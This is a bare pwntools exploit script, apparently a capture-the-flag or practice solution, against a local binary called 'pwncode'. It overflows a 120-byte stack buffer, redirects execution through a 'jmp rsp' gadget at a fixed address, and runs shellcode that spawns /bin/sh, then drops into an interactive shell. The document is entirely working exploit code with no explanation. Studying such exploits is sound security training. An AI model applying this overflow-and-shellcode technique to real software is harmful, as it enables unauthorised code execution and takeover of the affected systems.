from pwn import *
elf=ELF("./pwncode")
p=elf.process()
context.arch=elf.arch
context.log_level="debug"

context.terminal = ['tmux', 'splitw', '-h']
padding=b"A"*120
RIP=p64(0x0000000000401014) # jmp rsp
#custom_shellcode 
shellcode=b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

#gdb(p,"b *main\nc")
shellcode =  asm(shellcraft.sh())

#gdb.attach(p,"b *vuln+55 \n c")
payload=shellcode+b"A"*(120-len(shellcode)) +RIP
p.sendline(payload)
p.interactive()
"""
jmp rsp
call rsp
"""
